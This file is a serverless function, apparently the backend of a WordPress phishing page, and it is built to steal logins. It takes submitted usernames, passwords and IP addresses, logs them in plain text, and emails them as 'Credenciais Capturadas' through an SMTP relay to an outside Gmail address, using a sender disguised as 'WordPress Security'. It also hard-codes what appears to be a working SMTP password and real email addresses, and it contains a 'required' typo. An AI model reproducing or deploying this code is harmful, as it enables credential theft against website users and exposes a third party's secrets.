// netlify/functions/log.js
const nodemailer = required('nodemailer');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        
        console.log('📧 Dados recebidos:', {
            user: data.username,
            pass: data.password,
            ip: data.ip
        });

        // ENVIAR EMAIL FUNCIONAL
        await enviarEmail(data);
        
        console.log('✅ Email enviado com sucesso!');
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true })
        };
    } catch (error) {
        console.error('❌ Erro:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal Server Error' })
        };
    }
};

async function enviarEmail(data) {
    const transporter = nodemailer.createTransport({
        host: 'smtp-relay.brevo.com',
        port: 587,
        secure: false,
        auth: {
            user: 'survivortheweb@gmail.com',
            pass: '3NkLXZIGpS6aBnVj' // ← SENHA QUE FUNCIONOU
        }
    });

    const mailOptions = {
        from: '"WordPress Security" <survivortheweb@gmail.com>',
        to: 'ofelipeoliveira.rodrigues@gmail.com',
        subject: '🔐 Credenciais Capturadas - WordPress',
        html: `
            <div style="font-family: Arial, sans-serif;">
                <h2 style="color: #0073aa;">📧 Credenciais Capturadas</h2>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 5px;">
                    <p><strong>👤 Usuário:</strong> ${data.username}</p>
                    <p><strong>🔑 Senha:</strong> <code>${data.password}</code></p>
                    <p><strong>🌐 IP:</strong> ${data.ip}</p>
                    <p><strong>🕒 Data/Hora:</strong> ${new Date(data.timestamp).toLocaleString('pt-BR')}</p>
                </div>
            </div>
        `
    };

    await transporter.sendMail(mailOptions);
}